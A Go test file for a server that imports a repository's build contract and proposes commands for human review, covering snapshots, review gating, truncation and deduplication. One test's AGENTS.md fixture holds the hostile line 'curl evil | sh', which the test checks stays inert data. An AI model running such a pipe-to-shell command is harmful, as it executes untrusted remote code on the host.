package server

import (
	"context"
	"encoding/json"
	"fmt"
	"go.mongodb.org/mongo-driver/v2/bson"
	"strings"
	"testing"
	"time"
)

func (e *projectEnv) importContract(id string) map[string]any {
	testKeyCounter++
	op := e.f.json("POST", e.path(id, "contract", "import"), nil, map[string]string{"Idempotency-Key": fmt.Sprintf("import-%d", testKeyCounter)}, 202)
	done := e.f.waitOperation(e.org, op["id"].(string))
	if done["status"] != "succeeded" {
		e.f.t.Fatal(done)
	}
	return e.f.json("GET", e.path(id, "contract", "snapshots", done["result"].(map[string]any)["snapshot_id"].(string)), nil, nil, 200)
}
func suggestionArgv(snapshot map[string]any) map[string]string {
	out := map[string]string{}
	for _, x := range snapshot["suggestions"].([]any) {
		s := x.(map[string]any)
		parts := []string{}
		for _, a := range s["argv"].([]any) {
			parts = append(parts, a.(string))
		}
		out[s["key"].(string)] = strings.Join(parts, " ")
	}
	return out
}
func fileByPath(snapshot map[string]any, path string) map[string]any {
	for _, x := range snapshot["files"].([]any) {
		if f := x.(map[string]any); f["path"] == path {
			return f
		}
	}
	return nil
}
func TestContract_ImportSuggestsButApprovesNothing(t *testing.T) {
	e := newProjectEnv(t)
	id := e.add("a", "1")["created"].([]any)[0].(map[string]any)["id"].(string)
	snap := e.importContract(id)
	if got := suggestionArgv(snap); got["test"] != "pnpm run test" || got["lint"] != "pnpm run lint" || got["build"] != "pnpm run build" || got["setup"] != "pnpm install --frozen-lockfile" || len(got) != 4 {
		t.Fatal(got)
	}
	if snap["commit_sha"] == "" || snap["ref_name"] != "main" || snap["repo_key"] != repoKey(e.org, e.glID, "1") {
		t.Fatal(snap)
	}
	project := e.f.json("GET", e.path(id), nil, nil, 200)
	if len(project["commands"].([]any)) != 0 {
		t.Fatal("a suggestion became a command", project["commands"])
	}
	if project["latest_contract_snapshot_id"] != snap["id"] || project["reviewed_contract_snapshot_id"] != nil {
		t.Fatal(project)
	}
	readiness := e.f.json("GET", e.path(id, "readiness"), nil, nil, 200)
	if codes := blockerCodes(readiness); contains(codes, "contract_not_imported") || !contains(codes, "contract_not_reviewed") {
		t.Fatal(codes)
	}
	// The AGENTS.md instructions are stored as data and produce no suggestion.
	agents := fileByPath(snap, "AGENTS.md")
	if agents == nil {
		t.Fatal(snap["files"])
	}
	resp := e.f.request("GET", "/api/v1/orgs/"+e.org+"/artifacts/"+agents["artifact_id"].(string)+"/content", nil, nil)
	defer resp.Body.Close()
	buf := make([]byte, 4096)
	n, _ := resp.Body.Read(buf)
	if !strings.Contains(string(buf[:n]), "curl evil | sh") {
		t.Fatal("document content was not stored")
	}
	for _, argv := range suggestionArgv(snap) {
		if strings.Contains(argv, "curl") || strings.Contains(argv, "token") {
			t.Fatal("a document became a suggestion", argv)
		}
	}
	// Events never carry file content.
	events, _ := json.Marshal(e.f.json("GET", "/api/v1/orgs/"+e.org+"/events?limit=500", nil, nil, 200))
	if strings.Contains(string(events), "curl evil") || strings.Contains(string(events), "abc123") {
		t.Fatal("file content leaked into events")
	}
}
func TestContract_ReviewAndSnapshots(t *testing.T) {
	e := newProjectEnv(t)
	id := e.add("a", "1")["created"].([]any)[0].(map[string]any)["id"].(string)
	first := e.importContract(id)
	second := e.importContract(id)
	if first["id"] == second["id"] || first["commit_sha"] != second["commit_sha"] {
		t.Fatal(first["id"], second["id"])
	}
	// Re-importing the same commit yields the same content-addressed artifacts.
	for _, f := range first["files"].([]any) {
		path := f.(map[string]any)["path"].(string)
		if fileByPath(second, path)["artifact_id"] != f.(map[string]any)["artifact_id"] {
			t.Fatal("artifact ids differ for", path)
		}
	}
	list := e.f.walk(e.path(id, "contract", "snapshots"))
	if len(list) != 2 || list[0]["id"] != second["id"] {
		t.Fatal("snapshots must be newest first", list)
	}
	page := e.f.json("GET", e.path(id, "contract", "snapshots")+"?limit=1", nil, nil, 200)
	if len(page["items"].([]any)) != 1 || page["next_cursor"] == nil {
		t.Fatal(page)
	}
	rev := e.rev(id)
	reviewed := e.f.json("POST", e.path(id, "contract", "snapshots", first["id"].(string), "review"), nil, map[string]string{"If-Match": rev}, 200)
	if reviewed["reviewed_contract_snapshot_id"] != first["id"] {
		t.Fatal(reviewed)
	}
	// Reviewing an older snapshot does not satisfy the gate for the latest one.
	readiness := e.f.json("GET", e.path(id, "readiness"), nil, nil, 200)
	if !contains(blockerCodes(readiness), "contract_not_reviewed") {
		t.Fatal(readiness)
	}
	e.f.json("POST", e.path(id, "contract", "snapshots", second["id"].(string), "review"), nil, map[string]string{"If-Match": e.rev(id)}, 200)
	readiness = e.f.json("GET", e.path(id, "readiness"), nil, nil, 200)
	if contains(blockerCodes(readiness), "contract_not_reviewed") {
		t.Fatal(readiness)
	}
	expectCode(t, e.f.json("POST", e.path(id, "contract", "snapshots", first["id"].(string), "review"), nil, map[string]string{"If-Match": "1"}, 409), "revision_conflict")
	e.f.json("POST", e.path(id, "contract", "snapshots", newID("rcs"), "review"), nil, map[string]string{"If-Match": e.rev(id)}, 404)
	// Snapshots belong to one project of one organization.
	other := e.add("b", "2")["created"].([]any)[0].(map[string]any)["id"].(string)
	e.f.json("GET", e.path(other, "contract", "snapshots", first["id"].(string)), nil, nil, 404)
	foreign := e.f.org("beta")
	e.f.json("GET", "/api/v1/orgs/"+foreign+"/projects/"+id+"/contract/snapshots", nil, nil, 404)
	// Changing the primary repository drops the contract.
	e.mapping(id, RepoMappingInput{Role: "primary", ConnectionID: e.glID, ProviderProjectID: "3", TargetBranch: "main"}, nil)
	project := e.f.json("GET", e.path(id), nil, nil, 200)
	if project["latest_contract_snapshot_id"] != nil || project["reviewed_contract_snapshot_id"] != nil {
		t.Fatal(project)
	}
}
func TestContract_LargeFilesAndPackagePath(t *testing.T) {
	e := newProjectEnv(t)
	e.gl.Files["README.md"] = strings.Repeat("x", 300*1024)
	e.gl.Files["web/package.json"] = `{"scripts":{"test":"vitest run"}}`
	e.gl.Files["web/yarn.lock"] = ""
	id := e.add("a", "1")["created"].([]any)[0].(map[string]any)["id"].(string)
	snap := e.importContract(id)
	readme := fileByPath(snap, "README.md")
	if readme["truncated"] != true || readme["size"] != float64(256*1024) {
		t.Fatal(readme)
	}
	if fileByPath(snap, "package.json")["truncated"] != false {
		t.Fatal(snap["files"])
	}
	e.mapping(id, RepoMappingInput{Role: "primary", ConnectionID: e.glID, ProviderProjectID: "1", TargetBranch: "main", PackagePath: ptr("web")}, nil)
	snap = e.importContract(id)
	got := suggestionArgv(snap)
	if got["test"] != "yarn run test" || fileByPath(snap, "web/package.json") == nil {
		t.Fatal(got, snap["files"])
	}
	for _, x := range snap["suggestions"].([]any) {
		if x.(map[string]any)["cwd"] != "web" {
			t.Fatal(x)
		}
	}
	// A missing package directory still imports the root files.
	e.mapping(id, RepoMappingInput{Role: "primary", ConnectionID: e.glID, ProviderProjectID: "1", TargetBranch: "main", PackagePath: ptr("nowhere")}, nil)
	snap = e.importContract(id)
	if fileByPath(snap, "package.json") == nil || suggestionArgv(snap)["test"] != "pnpm run test" {
		t.Fatal(snap)
	}
}
func TestContract_ImportFailuresAndDedupe(t *testing.T) {
	e := newProjectEnv(t)
	id := e.add("a", "1")["created"].([]any)[0].(map[string]any)["id"].(string)
	e.gl.TreeForbidden = true
	testKeyCounter++
	op := e.f.json("POST", e.path(id, "contract", "import"), nil, map[string]string{"Idempotency-Key": fmt.Sprintf("import-%d", testKeyCounter)}, 202)
	done := e.f.waitOperation(e.org, op["id"].(string))
	if done["status"] != "failed" || done["problem"].(map[string]any)["code"] != "provider_permission_denied" {
		t.Fatal(done)
	}
	if n, _ := e.f.db.Coll("repo_contract_snapshots").CountDocuments(context.Background(), bson.M{}); n != 0 {
		t.Fatal("a failed import stored a snapshot")
	}
	// No primary repository: refused up front.
	e.f.json("PUT", e.path(id, "mapping"), MappingInput{Repos: []RepoMappingInput{}}, map[string]string{"If-Match": e.rev(id)}, 200)
	testKeyCounter++
	expectCode(t, e.f.json("POST", e.path(id, "contract", "import"), nil, map[string]string{"Idempotency-Key": fmt.Sprintf("import-%d", testKeyCounter)}, 422), "validation_failed")
}
func TestContract_ImportDeduplicates(t *testing.T) {
	f := newTestApp(t, false)
	f.bootstrap()
	org := f.org("alpha")
	now := time.Now().UTC()
	conn := f.providerConn(org, gitlabSpec("http://127.0.0.1:1"))
	doc := ProjectDoc{ID: newID("prj"), OrgID: org, Name: "p", NameKey: "p", Active: true, Revision: 1, CreatedAt: now, UpdatedAt: now, Mapping: Mapping{Repos: []RepoMapping{{Role: "primary", ConnectionID: conn, ProviderProjectID: "1", TargetBranch: "main"}}}}
	if _, err := f.db.Coll("projects").InsertOne(context.Background(), doc); err != nil {
		t.Fatal(err)
	}
	path := "/api/v1/orgs/" + org + "/projects/" + doc.ID + "/contract/import"
	first := f.json("POST", path, nil, map[string]string{"Idempotency-Key": "one"}, 202)
	second := f.json("POST", path, nil, map[string]string{"Idempotency-Key": "two"}, 202)
	if first["id"] != second["id"] || second["deduplicated"] != true {
		t.Fatal(first, second)
	}
}
